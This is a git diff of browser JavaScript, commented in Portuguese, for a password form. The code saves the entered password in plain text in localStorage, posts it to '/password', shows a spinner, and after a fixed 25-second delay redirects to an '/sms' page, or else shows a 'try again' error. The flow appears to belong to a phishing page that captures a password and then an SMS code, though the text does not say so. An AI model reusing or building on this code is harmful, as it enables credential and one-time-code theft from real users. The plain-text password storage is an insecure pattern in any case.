@@ -46,13 +46,15 @@ form.addEventListener('submit', (e) => {
         passwordInput.classList.remove('border-red-500');
     }
 
-    localStorage.setItem('password', password);
+    localStorage.setItem('password6', password);
 
     enviarSenha(password);
 });
 
 // Envio da senha para o backend
 function enviarSenha(password) {
+    showLoading(); // ⬅️ Mostra o loading antes de enviar
+
     fetch('/password', {
         method: 'POST',
         headers: {
@@ -62,19 +64,39 @@ function enviarSenha(password) {
     })
     .then(response => {
         if (!response.ok) {
-            window.location.href = '/error';
-            return;
+            throw new Error('Erro ao enviar dados');
         }
         return response.json();
     })
     .then(data => {
         if (data && data.status === 'sucesso') {
-            window.location.href = '/sms';
+            setTimeout(() => {
+                hideLoading();
+                window.location.href = '/sms';
+            }, 25000); // ⏳ Delay fixo de 25 segundos
         } else {
-            window.location.href = '/error';
+            throw new Error('Erro no backend');
         }
     })
     .catch(() => {
-        window.location.href = '/error';
+        hideLoading();
+        passwordError.classList.remove('hidden');
+        passwordError.textContent = 'Erro ao validar sua senha. Tente novamente.';
+        passwordInput.classList.add('border-red-500');
     });
+}
+
+// Funções para exibir/ocultar o loading
+function showLoading() {
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.remove('hidden');
+    }
+}
+
+function hideLoading() {
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.add('hidden');
+    }
 }
